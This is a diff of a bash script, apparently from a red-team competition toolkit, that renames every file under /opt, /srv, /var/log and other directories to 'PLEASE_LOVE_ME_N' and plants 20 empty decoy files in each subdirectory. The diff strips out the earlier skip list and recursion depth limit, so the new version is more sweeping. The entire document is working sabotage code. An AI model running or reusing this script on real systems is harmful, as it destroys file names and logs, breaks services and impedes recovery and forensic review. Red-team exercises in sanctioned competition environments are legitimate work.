@@ -1,16 +1,5 @@
 #!/bin/bash
 
-SKIP_DIRS=(
-    /proc /sys /run /dev
-    /bin /sbin
-    /lib /lib64
-    /boot /tmp
-    /usr
-    /etc
-    /etc/systemd /etc/init.d
-    /home/ubuntu/cdt-2026-redteam-tools
-)
-
 TARGET_DIRS=(
     /opt
     /srv
@@ -19,44 +8,46 @@ TARGET_DIRS=(
     /var/log
 )
 
-should_skip() {
-    local target="${1%/}"
-    for skip in "${SKIP_DIRS[@]}"; do
-        [ "$target" = "$skip" ] && return 0
-    done
-    return 1
-}
+# Global counter for unique file names
+counter=1
 
-traverse() {
+rename_files() {
     local dir="$1"
-    local depth="${2:-0}"
 
-    [ "$depth" -gt 8 ] && return
-
-    for entry in "$dir"/*/; do
-        [ -d "$entry" ] || continue
-        entry="${entry%/}"
-        should_skip "$entry" && continue
-        traverse "$entry" $((depth + 1))
-        for i in {1..20}; do
-            > "$entry/PLEASE_LOVE_ME_${i}"
-        done
-    done
-
-    local count=50
+    # Rename all existing files in this dir
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
-        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${count}"
-        ((count++))
+        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${counter}"
+        ((counter++))
+    done
+
+    # Recurse into subdirs
+    for entry in "$dir"/*/; do
+        [ -d "$entry" ] || continue
+        rename_files "${entry%/}"
     done
 }
 
-# Hit targets in order
+create_files() {
+    local dir="$1"
+
+    # Create 20 files in each subdir
+    for entry in "$dir"/*/; do
+        [ -d "$entry" ] || continue
+        for i in {1..20}; do
+            > "${entry%/}/PLEASE_LOVE_ME_${i}"
+        done
+        # Recurse
+        create_files "${entry%/}"
+    done
+}
+
+cd /
+
 for target in "${TARGET_DIRS[@]}"; do
-    if [ -d "$target" ]; then
-        echo "[*] Hitting $target"
-        traverse "$target"
-    else
-        echo "[SKIP] $target does not exist"
-    fi
+    [ -d "$target" ] || { echo "[SKIP] $target not found"; continue; }
+    echo "[*] Renaming files in $target"
+    rename_files "$target"
+    echo "[*] Creating decoy files in $target"
+    create_files "$target"
 done
